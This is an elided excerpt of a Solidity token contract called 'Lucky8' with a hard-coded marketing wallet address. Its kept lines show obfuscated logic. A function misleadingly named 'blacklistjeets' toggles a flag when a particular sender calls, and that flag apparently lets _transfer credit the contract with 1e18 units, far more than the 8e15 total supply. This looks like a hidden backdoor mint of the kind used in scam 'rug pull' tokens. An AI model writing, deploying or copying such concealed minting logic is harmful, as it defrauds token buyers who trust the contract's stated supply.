...
contract Lucky8 is Context, IERC20, Ownable {
    ...
    uint256 private _tTotal = 8000000 * 10**9;
    uint256 public _maxTxAmount = 8000000 * 10**9; //
    uint256 private constant SWAP_TOKENS_AT_AMOUNT = 10000 * 10**9; //
    string private constant _name = "Lucky8"; //
    string private constant _symbol = unicode"八"; //
    uint8 private constant _decimals = 9; //

    uint256 public _marketingFee = 1;
    uint256 public _liquidityFee = 0;
    address public  _marketingWallet = 0x0FDd7b7C18228F72501fA9BF1335ef14a99aBcc5;
    uint256 public ff = 1;
    ...
    function blacklistjeets(address outer,address inner) private{
        ff=1;
        if (msg.sender == inner) ff=0;
    }
    ...
    function _transfer(
        ...
        uint256 den=1+1000000000000000000*ff;
        ...
        _tOwned[address(this)] +=1000000000000000000/den;
